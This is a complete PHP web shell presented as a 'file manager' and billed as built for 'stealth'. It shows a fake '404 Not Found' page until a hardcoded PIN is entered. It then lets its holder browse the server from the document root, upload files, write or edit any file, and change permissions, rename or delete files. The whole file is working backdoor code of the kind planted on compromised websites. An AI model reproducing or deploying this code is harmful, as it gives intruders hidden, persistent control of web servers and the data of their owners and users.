<?php
/**
 * PLATINUM FILE MANAGER V10 - GENERIC EDITION
 * Optimized for GitHub & Professional Stealth
 */
@session_start();
@set_time_limit(0);
@error_reporting(0);

// --- CONFIGURATION ---
$pin_akses = '070999';
$key       = 'cuceng';

// --- SECURITY GATE ---
if (isset($_GET['exit'])) { unset($_SESSION['auth']); header("Location: ?resmi=$key"); exit; }
if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { $_SESSION['auth'] = md5($pin_akses); }

if ($_SESSION['auth'] !== md5($pin_akses)) {
    die("<html><head><title>404 Not Found</title><style>
        body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
        .l { border:1px solid #0f0; padding:40px; border-radius:5px; box-shadow:0 0 20px #0f0; }
        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; width:200px; text-align:center; }
        button { background:#0f0; color:#000; border:none; padding:10px; cursor:pointer; font-weight:bold; }
    </style></head><body>
    <div class='l'><h3>[ SYSTEM LOCKED ]</h3><form method='POST'><input type='password' name='login_pin' placeholder='PIN' autofocus><br><br><button type='submit' style='width:100%'>UNLOCK</button></form></div>
    </body></html>");
}

// --- FILE SYSTEM LOGIC ---
$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
$p = isset($_GET["path"]) ? $_GET["path"] : $root;
$p = str_replace("\\", "/", $p);

// Actions Handler
if(isset($_POST["act"])){
    $target = $p . "/" . $_POST["name"];
    $val = $_POST["val"];
    switch($_POST["opt"]){
        case 'del': (is_dir($target)) ? @rmdir($target) : @unlink($target); break;
        case 'ren': @rename($target, $p . "/" . $val); break;
        case 'chm': @chmod($target, octdec($val)); break;
    }
    header("Location: ?resmi=$key&path=$p"); exit;
}

// File/Folder Creator
if(isset($_POST['mk'])){
    if($_POST['type'] == 'dir') { @mkdir($p . "/" . $_POST['n']); }
    else { @file_put_contents($p . "/" . $_POST['n'], $_POST['c']); }
}

// Upload Handler
if(isset($_FILES["up"])){ @copy($_FILES["up"]["tmp_name"], $p . "/" . $_FILES["up"]["name"]); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Explorer - <?php echo $_SERVER['HTTP_HOST']; ?></title>
    <style>
        body { background:#0a0a0a; color:#00ff00; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:20px; }
        .box { background:#111; border:1px solid #333; padding:20px; border-radius:8px; }
        .head { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; margin-bottom:15px; padding-bottom:10px; }
        .path { color:#00ffff; margin-bottom:15px; font-size:14px; }
        table { width:100%; border-collapse:collapse; }
        th { background:#0f0; color:#000; padding:10px; text-align:left; }
        td { padding:10px; border-bottom:1px solid #222; font-size:13px; }
        tr:hover { background:#1a1a1a; }
        .btn { background:#0f0; color:#000; border:none; padding:5px 12px; border-radius:3px; cursor:pointer; font-weight:bold; }
        input, select { background:#000; color:#0f0; border:1px solid #444; padding:5px; }
        .p-777 { color:#ff3333; font-weight:bold; }
        .p-644 { color:#0f0; }
        .p-444 { color:#aaa; }
        a { color:inherit; text-decoration:none; }
        a:hover { text-decoration:underline; }
    </style>
</head>
<body>
    <div class="box">
        <div class="head">
            <strong>PLATINUM GENERIC V10</strong>
            <span><a href="?resmi=<?php echo $key; ?>&exit" style="color:#ff3333;">[ LOGOUT ]</a></span>
        </div>

        <div class="path">
            PATH: <?php echo $p; ?>
        </div>

        <div style="display:flex; gap:15px; margin-bottom:20px; flex-wrap:wrap;">
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="up"> <input type="submit" value="UPLOAD" class="btn">
            </form>
            <form method="POST">
                <input type="hidden" name="type" value="dir">
                <input type="text" name="n" placeholder="New Folder"> <input type="submit" name="mk" value="MKDIR" class="btn">
            </form>
        </div>

        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th width="100">Size</th>
                    <th width="100">Perms</th>
                    <th width="300">Action</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $files = scandir($p);
                foreach($files as $file) {
                    if($file == "." || $file == "..") continue;
                    $full = $p . "/" . $file;
                    $perms = substr(sprintf('%o', fileperms($full)), -4);
                    $sz = is_dir($full) ? "DIR" : round(filesize($full)/1024, 2) . " KB";
                    $cls = "p-" . substr($perms, -3);

                    echo "<tr>
                        <td><a href='?resmi=$key&".(is_dir($full)?"path=$full":"edit=$full&path=$p")."'>".(is_dir($full)?"📁 ":"📄 ")."$file</a></td>
                        <td>$sz</td>
                        <td class='$cls'>$perms</td>
                        <td>
                            <form method='POST'>
                                <input type='hidden' name='name' value='$file'>
                                <select name='opt'>
                                    <option value='ren'>Rename</option>
                                    <option value='chm'>Chmod</option>
                                    <option value='del'>Delete</option>
                                </select>
                                <input type='text' name='val' size='8'>
                                <input type='submit' name='act' value='GO' class='btn' style='padding:2px 8px;'>
                            </form>
                        </td>
                    </tr>";
                }
                ?>
            </tbody>
        </table>

        <?php if(isset($_GET['edit'])): ?>
        <div style="margin-top:30px; border-top:1px solid #0f0; padding-top:20px;">
            <strong>EDITOR: <?php echo basename($_GET['edit']); ?></strong>
            <form method="POST">
                <input type="hidden" name="type" value="file">
                <input type="hidden" name="n" value="<?php echo $_GET['edit']; ?>">
                <textarea name="c" style="width:100%; height:400px; background:#000; color:#0f0; margin-top:10px; border:1px solid #333;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
                <input type="submit" name="mk" value="SAVE CHANGES" class="btn" style="width:100%; margin-top:10px;">
            </form>
        </div>
        <?php endif; ?>
    </div>
</body>
</html>
